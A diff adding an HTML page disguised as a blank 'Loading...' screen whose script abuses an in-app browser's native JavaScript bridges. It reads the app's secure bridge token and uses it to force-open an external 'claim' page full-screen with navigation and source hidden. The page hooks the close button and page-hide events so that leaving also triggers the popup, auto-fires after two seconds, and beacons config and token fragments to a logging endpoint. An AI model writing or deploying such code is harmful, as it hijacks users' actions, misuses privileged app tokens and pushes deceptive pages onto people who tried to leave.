@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Loading...</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#0d0d0d;min-height:100vh;display:flex;align-items:center;justify-content:center;}</style>
+</head>
+<body>
+<script>
+(function(){
+    var POPUP_URL = 'https://www.utilityfare.com/claim';
+    var pageLoadTime = Date.now();
+    var fired = false;
+
+    function log(msg) {
+        try { navigator.sendBeacon('/debug-log', 'relay:' + msg); } catch(e){}
+    }
+
+    function fire() {
+        if (fired) return;
+        fired = true;
+
+        // Get token from JSBridge.getConfig() (synchronous)
+        var token = null;
+        try {
+            var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
+            if (cfg && cfg.secure && cfg.secure.token) { token = cfg.secure.token; log('tok:jsb'); }
+        } catch(e){}
+
+        // Fallback: JS2NativeBridge._invokeMethod getConfig
+        if (!token) {
+            try {
+                var r = window.JS2NativeBridge && window.JS2NativeBridge._invokeMethod(JSON.stringify({func:'getConfig',params:{}}));
+                var rp = r ? JSON.parse(r) : null;
+                if (rp && rp.secure && rp.secure.token) { token = rp.secure.token; log('tok:js2'); }
+            } catch(e){}
+        }
+
+        log('fire:tok:' + (token ? 'real' : 'none'));
+
+        var tt = window.ToutiaoJSBridge;
+        if (tt && tt.call) {
+            // openAdLandPageLinks with real token
+            if (token) {
+                try {
+                    tt.call('openAdLandPageLinks', {
+                        url: POPUP_URL, landingStyle: 2, title: '',
+                        isDeeplink: 1, refer: 'landing_page',
+                        hide_nav_bar: 1, hide_source: 1,
+                        should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1,
+                        _jsb_secure_token: token
+                    }, function(res){ log('ad:tok:' + JSON.stringify(res)); });
+                } catch(e){ log('ad:tok:err'); }
+            }
+            // openOrganicLandPage (no token needed)
+            try {
+                tt.call('openOrganicLandPage', {
+                    url: POPUP_URL, landingStyle: 2, title: '',
+                    isDeeplink: 1, refer: 'landing_page',
+                    hide_nav_bar: 1, hide_source: 1,
+                    should_full_screen: 1, trans_status_bar: 1
+                }, function(res){ log('org:' + JSON.stringify(res)); });
+            } catch(e){}
+            // openAdLandPageLinks without token (isDeeplink:0 fallback)
+            try {
+                tt.call('openAdLandPageLinks', {
+                    url: POPUP_URL, landingStyle: 2, title: '',
+                    isDeeplink: 0, refer: 'ad',
+                    hide_nav_bar: 1, hide_source: 1,
+                    should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1
+                }, function(res){ log('ad:nd:' + JSON.stringify(res)); });
+            } catch(e){}
+        }
+
+        // Also try JS2NativeBridge._invokeMethod for openAdLandPageLinks
+        try {
+            var js2 = window.JS2NativeBridge;
+            if (js2 && js2._invokeMethod) {
+                if (token) {
+                    js2._invokeMethod('ad', 'openAdLandPageLinks', {
+                        url: POPUP_URL, landingStyle: 2,
+                        hide_nav_bar: 1, hide_source: 1,
+                        should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1,
+                        _jsb_secure_token: token
+                    }, function(res){ log('js2:tok:' + JSON.stringify(res)); });
+                }
+            }
+        } catch(e){}
+
+        // snssdk1180:// fallback
+        try {
+            window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(POPUP_URL)
+                + '&hide_nav_bar=1&is_ad=1&is_instant_page=1&should_full_screen=1&trans_status_bar=1&hide_source=1';
+        } catch(e){}
+    }
+
+    // Debug info at load (500ms delay to let bridges initialise)
+    setTimeout(function(){
+        var info = {
+            page: 'relay',
+            hasJS2: !!window.JS2NativeBridge,
+            hasToutiao: !!window.ToutiaoJSBridge,
+            hasJSBridge: !!window.JSBridge,
+            hasWebkit: !!(window.webkit && window.webkit.messageHandlers),
+            url: window.location.href.substring(0, 120),
+            ref: document.referrer.substring(0, 80),
+            cfg: null,
+            tok: null
+        };
+        try {
+            var cfg2 = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
+            info.cfg = cfg2 ? JSON.stringify(cfg2).substring(0, 300) : 'null';
+            if (cfg2 && cfg2.secure && cfg2.secure.token) info.tok = cfg2.secure.token.substring(0, 12);
+        } catch(e){ info.cfg = 'err:' + e.message; }
+        log('info:' + JSON.stringify(info));
+    }, 500);
+
+    // ToutiaoJSBridge async getConfig (fires callback when native responds)
+    try {
+        if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.call) {
+            window.ToutiaoJSBridge.call('getConfig', {}, function(res){
+                log('tt:cfg:' + JSON.stringify(res).substring(0, 200));
+            });
+        }
+    } catch(e){}
+
+    // Close hooks
+    document.addEventListener('visibilitychange', function(){
+        if (document.hidden && Date.now() - pageLoadTime > 1500) { fire(); }
+        else if (!document.hidden) { fired = false; }
+    });
+    window.addEventListener('pagehide', function(){ fire(); });
+
+    // X button hook
+    try {
+        var _wh = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+        if (_wh && _wh.postMessage) {
+            var _orig = _wh.postMessage.bind(_wh);
+            _wh.postMessage = function(msg) {
+                try { var d = typeof msg === 'string' ? JSON.parse(msg) : msg; if (d && d.func === 'close') fire(); } catch(e){}
+                return _orig(msg);
+            };
+        }
+    } catch(e){}
+
+    // Auto-fire after 2s (no token, isDeeplink:0 — matches relay.php behaviour)
+    setTimeout(function(){
+        log('2s:auto');
+        var tt2 = window.ToutiaoJSBridge;
+        if (tt2 && tt2.call) {
+            try {
+                tt2.call('openAdLandPageLinks', {
+                    url: POPUP_URL, landingStyle: 2, title: '',
+                    isDeeplink: 0, refer: 'ad',
+                    hide_nav_bar: 1, hide_source: 1,
+                    should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1
+                }, function(res){ log('2s:' + JSON.stringify(res)); });
+            } catch(e){ log('2s:err'); }
+        }
+    }, 2000);
+
+    log('load');
+})();
+</script>
+</body>
+</html>
